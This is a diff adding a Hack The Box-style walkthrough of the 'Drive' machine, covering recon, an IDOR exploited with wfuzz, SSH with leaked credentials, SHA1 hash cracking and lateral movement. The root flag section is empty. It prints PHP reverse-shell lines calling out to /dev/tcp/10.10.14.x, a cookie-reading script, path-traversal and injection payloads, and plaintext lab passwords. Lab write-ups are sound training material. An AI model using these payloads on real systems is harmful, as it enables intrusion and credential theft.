@@ -353,3 +353,124 @@ print(current_read)
 
 Running it on the box we get the ssh key and login as root. 
 
+## Drive
+Find out how to read other files. FUZZ for valid entries where it gives unauthorized but files exists, etc. Then you will see how to actually read those files that exist. After that step foothold is right away. Then moving laterally to a different user. After shell, on the server you will find some zips of sqlite db backups - which will contain pwd hashes! You need to get into the gitea that is filtered (seen from nmap scan RIGHT??). Port fwd that once you have foothold obviously. In the gitea once logged you will see right away the archive password. Unzip and his is how you find sql hashes. Crack them. Be smart. Use tools appropriately. Check all backups since not every credential will work but you'll get the user. And done.
+### Reco
+nmap -sVC -Pn 10.10.11.235
+    - 22 SSH -> OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
+    - 80 HTTP -> redirect to http://drive.htb/
+        - add to /etc/hosts
+    - 3000 PPP -> filtered ppp
+
+Dir busting
+    - dirb http://drive.htb
+    
++ http://drive.htb/contact (CODE:301|SIZE:0)                                                                             
++ http://drive.htb/favicon.ico (CODE:200|SIZE:2348)                                                                      
++ http://drive.htb/home (CODE:301|SIZE:0)                                                                                
++ http://drive.htb/login (CODE:301|SIZE:0)                                                                               
++ http://drive.htb/logout (CODE:301|SIZE:0)                                                                              
++ http://drive.htb/register (CODE:301|SIZE:0)                                                                            
++ http://drive.htb/reports (CODE:301|SIZE:0)                                                                             
++ http://drive.htb/subscribe (CODE:301|SIZE:0)                                                                           
++ http://drive.htb/upload (CODE:301|SIZE:0)                                                                              
++ http://drive.htb/upload_file (CODE:302|SIZE:0)                                                                         
++ http://drive.htb/upload_files (CODE:302|SIZE:0)                                                                        
++ http://drive.htb/uploaded (CODE:302|SIZE:0)                                                                            
++ http://drive.htb/uploadedfiles (CODE:302|SIZE:0)                                                                       
++ http://drive.htb/uploadedimages (CODE:302|SIZE:0)                                                                      
++ http://drive.htb/uploader (CODE:302|SIZE:0)                                                                            
++ http://drive.htb/uploadfile (CODE:302|SIZE:0)                                                                          
++ http://drive.htb/uploadfiles (CODE:302|SIZE:0)                                                                         
++ http://drive.htb/uploads (CODE:302|SIZE:0)  
+
+### Enumeration
+Website analysis
+    - Doogle Drive
+    - login, register, contact form...
+    - register + login (Tester:testtest123)
+        - Dashboard
+            - File name, Owner, Group, Timestamp, Reserve
+            - Group: toto -> unauthorized access
+            - File SHELL: owner laurent
+                - <?php system("bash -c '/bin/bash -i >& /dev/tcp/10.10.14.25/9443 0>&1'"); ?> 
+            - File FICHIER: owner laurent
+                - <?php system("bash -c '/bin/bash -i >& /dev/tcp/10.10.14.25/9443 0>&1'"); ?>
+                - WE CAN EDIT IT
+            - File KLMU: owner vince
+                -  <html><script>var theCookies=document.cookie;document.write(theCookies);</script></html> 
+            - File TEST: owner vince
+                -  <html><script>var theCookies=document.cookie;document.write(theCookies);</script></html>
+            - File REE: owner vince
+                - <?php system("bash -c '/bin/bash -i >& /dev/tcp/10.10.14.25/9443 0>&1'"); ?> 
+
+### Weaponisation         
+- create a file REVERSE to test NC shell
+    - <?php system("bash -c '/bin/bash -i >& /dev/tcp/10.10.14.13/9443 0>&1'"); ?>
+    - Reserved the file to my account (Tester)
+    - http://drive.htb/130/getFileDetail/ => ID of my file is 130....we could change this ID to another to see file content we shouldnt :-)
+        - when we clock on "Reserve", the URL changes:
+            - before:   http://drive.htb/130/getFileDetail/
+            - after:    http://drive.htb/130/block/
+    - 114-119 are another uploaded files
+        - we probably wanna get content of some other ID than our 130...
+    - http://drive.htb/101/block/
+        - BOOM, we found the backup file
+            - database_backup_plan! 
+            - owner: jamesMason
+            - group: doodleGrive-development-team security-team 
+        - hi team! me and my friend(Cris) created a new scheduled backup plan for the database, the database will be automatically highly compressed and copied to /var/www/backups/ by a small bash script every day at 12:00 AM
+            - *Note: the backup directory may change in the future!
+            - *Note2: the backup would be protected with strong password! don't even think to crack it guys! :) 
+        - What we obtained:
+            - possible user:jamesMason, Cris
+            - file PATH: /var/www/backups
+            - no bruteforce PW needed
+    - wfuzz -u "http://drive.htb/FUZZ/block/" -z range,0-200 -H "Cookie: csrftoken=UMdfwebTV1r30QkJpz5VwyEkj6sLm1hB; sessionid=hcbg92ofxnbv8oazvdrkrdssqnj322ox" --hc 404
+        - CHANGE CSRFTOKEN AND SESSIONID WITH YOUR UNIQUE ONES (STORAGE:COOKIES)
+        - http://drive.htb/79/block/
+            - USER: martin
+            - PW: Xk4@KjyrYv8t194L!
+        - http://drive.htb/98/block/
+            - USER: crisDisel
+    - http://drive.htb/120/block/
+        - "+str(True)+"
+    - http://drive.htb/121/block/
+        - {%_debug_%}     
+    - http://drive.htb/122/block/
+        - '+{% ssi /home/html/../../etc/passwd %}+' 
+    - http://drive.htb/124/block/
+        - ${{7*7}} 
+    - http://drive.htb/125/block/    
+        - ..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/etc/passwd 
+    - http://drive.htb/126/block/    
+        - %252e%252e%252e%252e%252e%252eetc/passwd  
+    - http://drive.htb/127/block/    
+        - %00nema 
+    - http://drive.htb/128/block/    
+        - ....//....//....//....//....//etc//passwd 
+    - http://drive.htb/129/block/    
+        - ;ls  
+
+- SSH login to martin
+    - ssh martin@10.10.11.235
+        - PW: Xk4@KjyrYv8t194L!
+        - /home -> cris, git, martin, tom
+            - permission denied
+        - /var/www/backups 
+            - possible passwords for other accounts...
+        - scp folder backups...
+### User flag
+- Obtain credentials from scp backup folder
+    - 1_Nov_db_backup.sqlite3.7z
+        - 4 passwords in SHA1
+            - crack the SHA1 passwords...
+                - tomHands:sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a:johnmayer7
+- Lateral Movement -> su na Toma
+    - su tom
+        - PW: johnmayer7
+- cd /home/tom
+- cat flag.txt
+
+### Root flag
+
